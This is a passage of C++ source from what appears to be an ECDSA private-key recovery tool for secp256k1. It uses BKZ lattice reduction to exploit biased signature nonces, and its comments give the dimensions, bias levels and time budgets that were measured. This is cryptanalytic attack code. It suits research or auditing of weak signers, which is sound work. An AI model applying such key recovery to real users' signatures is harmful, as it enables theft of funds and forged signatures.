        // No pubkey to confirm against, but a maximal heuristic score is
        // already overwhelming -- accept it as the best-effort answer.
        if (pubkey_hint <= 1 && best_score >= max_possible_score && max_possible_score > 0
            && best_cand > 1 && best_cand < SECP256K1_N - 1) {
            return best_cand;
        }
    }

    // ---- Phase 2: focused BKZ sweep over the mid range (L=4..6) ----
    // These provably do not resolve under LLL at any dimension; each needs a
    // large per-L dimension AND a strong (block-30) BKZ reduction. The plan
    // below is measured, not derived: at 256-bit, L=5 and L=6 resolve
    // robustly at block 30 (both dims/seeds tested), so one shot each. L=4
    // sits right at the edge of what block 30 can do -- it succeeds at some
    // dimensions and misses at neighbouring ones for the same key (dim 221
    // solves, 281 misses, 301 solves) -- so it gets two independent
    // dimensions as a best-effort. L<=3 is deliberately absent: it needs
    // block_size >= 40 at dim >= 450, which does not finish in 15+ minutes,
    // and L<=2 does not converge at all in practice (measured; see the
    // project's design notes). Kept short on purpose -- a broad high-dimension BKZ sweep would
    // blow any realistic --max-time. Early-returns the instant a candidate
    // verifies against the pubkey.
    //
    // Note assuming a *smaller* L than the true bias is safe: the true nonce
    // still satisfies the looser bound, so a low-L trial also recovers any
    // stronger-bias data it happens to run against -- which is why this short
    // plan covers the whole L>=4 mid range even from FALLBACK's fixed
    // starting estimate.
    struct BkzPlan { int l; size_t train_m; };
    std::vector<BkzPlan> plan = {{6, 185}, {5, 225}, {4, 240}, {4, 300}};
    // If detection pinned a specific weak level, try its matched trials first.
    if (base_l >= 4 && base_l <= 6) {
        std::stable_partition(plan.begin(), plan.end(),
            [&](const BkzPlan& p) { return p.l == base_l; });
    }
    for (const auto& p : plan) {
        if (telemetry && telemetry->deadline_exceeded()) break;
        size_t train_m = std::min({p.train_m, use_count, TRAIN_M_CAP});
        if (train_m < 120) continue; // too few signatures for a weak-bias lattice
        int dim = static_cast<int>(train_m) + 1;
        int block = std::min(dim - 1, 30);

        // BKZ at these dimensions/block 30 measures ~35-120s; only start one
        // that clearly fits the remaining budget (fplll can't be interrupted
        // mid-call).
        if (telemetry && telemetry->remaining_budget_seconds() < 130.0) continue;

        auto found = run_trial(p.l, train_m, block);
        if (found) return *found;
    }

    if (best_cand > 1 && best_cand < SECP256K1_N - 1) {
        return best_cand;
    }

    return std::nullopt;
}
